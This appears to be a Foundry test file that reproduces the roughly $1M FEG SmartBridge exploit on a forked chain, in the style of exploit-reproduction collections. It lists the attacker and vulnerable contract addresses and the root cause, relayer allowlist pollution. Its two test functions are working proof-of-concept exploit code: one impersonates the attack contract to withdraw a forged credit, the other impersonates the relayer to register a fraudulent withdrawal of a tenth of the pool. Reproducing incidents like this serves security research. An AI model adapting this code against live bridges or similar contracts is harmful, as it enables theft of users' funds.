// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$1M+ multi-chain (ETH+BSC+Base)
// Attacker : https://etherscan.io/address/0xCB96ddE53F43035f7395D8DbdB652987F7630b3c
// Attack Contract (ETH) : https://etherscan.io/address/0xEf7Bd1543bDAcAdD7e42822e3F15Dd0af0410fDa
// Vulnerable Contract : https://etherscan.io/address/0x8d5c8d2856d518a5edc7473a3127341492b56243 (SmartBridge)
// Vulnerable Relayer : https://etherscan.io/address/0x3A3709b8c67270A84Fe96291B7E384044160C6b1
// Attack Tx (ETH withdraw) : https://etherscan.io/tx/0x6c3cf48e9c8b22f60fc2b702b03f93926ee8624639b100fe851b757947e61759

// @Analysis
// CertiK : https://www.certik.com/blog/feg-bridge-exploit-technical-analysis
// TenArmor : https://x.com/TenArmorAlert/status/1873254265294106791
// Root cause : FEG Wormhole relayer allowlist pollution — payload user=admin adds
//              attacker sourceAddress; forged messages registerWithdraw arbitrary
//              amounts → SmartBridge.withdraw().

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
}

interface ISmartBridge {
    function balance(address) external view returns (uint256);
    function withdraw(address to, uint256 withdrawID) external payable;
    function registerWithdraw(address ad, uint256 amount, uint16 sourceChain, uint256 id) external;
    function relayer() external view returns (address);
    function SD() external view returns (address);
}

contract FEGSmartBridge is BaseTestWithBalanceLog {
    address constant BRIDGE = 0x8d5c8D2856d518A5Edc7473a3127341492B56243;
    address constant ATTACK_C = 0xEf7Bd1543bDAcAdD7e42822e3F15Dd0af0410fDa;
    // Historical open withdraw id for ATTACK_C on ETH (attack trace)
    uint256 constant WITHDRAW_ID = 176;
    uint256 constant WITHDRAW_FEE = 838204870000001;
    uint256 constant BLOCK_BEFORE_WITHDRAW = 21506153;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8545", BLOCK_BEFORE_WITHDRAW);
        fundingToken = ISmartBridge(BRIDGE).SD();
    }

    /// @dev Drain after relayer accepted forged registerWithdraw (historical state).
    function testExploit() public {
        ISmartBridge bridge = ISmartBridge(BRIDGE);
        address feg = bridge.SD();

        uint256 credit = bridge.balance(ATTACK_C);
        emit log_named_uint("registered withdraw credit (raw)", credit);
        require(credit > 0, "no registered credit - wrong fork block");

        uint256 balBefore = IERC20Like(feg).balanceOf(ATTACK_C);
        emit log_named_decimal_uint("FEG before", balBefore, 18);

        vm.deal(ATTACK_C, WITHDRAW_FEE + 1 ether);
        vm.prank(ATTACK_C);
        bridge.withdraw{value: WITHDRAW_FEE}(ATTACK_C, WITHDRAW_ID);

        uint256 balAfter = IERC20Like(feg).balanceOf(ATTACK_C);
        emit log_named_decimal_uint("FEG after", balAfter, 18);
        emit log_named_decimal_uint("FEG gained", balAfter - balBefore, 18);

        require(balAfter > balBefore, "no FEG withdrawn");
        require(bridge.balance(ATTACK_C) < credit, "credit not consumed");
    }

    /// @dev Teaching path: privileged relayer forges registerWithdraw (stands in for Wormhole path).
    function testRelayerForgedRegister() public {
        ISmartBridge bridge = ISmartBridge(BRIDGE);
        address relayer = bridge.relayer();
        address feg = bridge.SD();
        address attacker = address(0xBEEF);

        uint256 pool = IERC20Like(feg).balanceOf(BRIDGE);
        uint256 amount = pool / 10;
        require(amount > 0, "bridge empty");

        vm.prank(relayer);
        bridge.registerWithdraw(attacker, amount, 8453, 999_999);

        require(bridge.balance(attacker) == amount, "register failed");
        emit log_named_decimal_uint("forged credit FEG", amount, 18);
    }
}
